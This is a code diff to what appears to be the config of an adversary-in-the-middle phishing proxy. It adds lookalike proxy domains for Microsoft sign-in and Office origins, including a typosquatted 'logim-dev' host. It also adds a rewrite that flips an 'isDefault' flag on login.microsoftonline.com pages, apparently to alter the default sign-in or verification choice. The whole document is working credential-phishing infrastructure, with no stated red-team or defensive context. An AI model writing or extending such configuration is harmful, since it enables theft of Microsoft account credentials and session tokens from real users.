@@ -16,6 +16,8 @@ config = Config(
 config.targets = [
     {"origin": "mysignins.microsoft.com", "proxy": "mysignins-dev.fsoc.bid", "port": 6000},
     {"origin": "login.microsoftonline.com", "proxy": "login-dev.fsoc.bid", "port": 6001},
+    {"origin": "login.microsoft.com", "proxy": "logim-dev.fsoc.bid", "port": 6002},
+    {"origin": "office.com", "proxy": "office-dev.fsoc.bid", "port": 6003},
 ]
 config.content_types = [
     "text/html",
@@ -30,5 +32,11 @@ config.custom_modifications = [
         "sites": ["mysignins.microsoft.com"],
         "search": "login.windows-ppe.net",
         "replace": "login-dev.fsoc.bid",
-    }
+    },
+    {
+        "mimes": ["text/html"],
+        "sites": ["login.microsoftonline.com"],
+        "search": '"isDefault":true',
+        "replace": '"isDefault":false',
+    },
 ]
